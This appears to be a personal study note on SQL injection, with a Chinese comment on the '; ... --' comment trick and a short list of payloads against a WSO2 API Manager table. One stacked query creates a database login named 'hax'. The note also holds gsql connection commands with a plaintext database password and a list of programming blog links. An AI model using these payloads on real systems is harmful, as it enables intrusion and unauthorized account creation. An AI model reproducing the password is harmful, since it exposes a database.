#“--”注释符，后面语句被省略。（常常的手法：前面加上'; ' (分号，用于结束前一条语句)，后边加上'--' (用于注释后边的语句)）
SELECT * FROM am_api WHERE API_ID='1' AND API_NAME='update_api_0193628';

SELECT * FROM am_api WHERE API_ID='1';-- AND API_NAME='update_api_0193628';


SELECT * FROM am_api WHERE API_ID='1' AND DB_NAME() >0;

SELECT * FROM am_api WHERE API_ID='1111' AND (select count('1') from am_api)>0;

select count('114') from am_api;exec sp_addlogin'hax';--;

SELECT * FROM am_api WHERE API_ID='1' AND 1=(SELECT COUNT(*) FROM am_env); --';


gsql -d WSO2AM_DB -U apimgtdb -W Amdb%^TY -p 15432

gsql -d WSO2CARBON_DB -p 15432 -U apimgtdb -W Amdb%^TY

http://www.cnblogs.com/heyuquan/archive/2012/10/31/2748577.html
http://www.cnblogs.com/tanshuicai/archive/2010/02/03/1664900.html
http://blog.csdn.net/wufeng4552/article/details/3449901
http://www.cnblogs.com/LoveJenny/archive/2013/01/15/2860553.html
http://www.cnblogs.com/swiftma/p/6399548.html
http://www.cnblogs.com/shanrengo/p/6403710.html
http://www.cnblogs.com/52fhy/p/6407121.html #00000000000000000
http://www.cnblogs.com/denny402/tag/python/
http://www.cnblogs.com/hongten/tag/tkinter/
http://www.cnblogs.com/Tommy-Yu/p/4171006.html

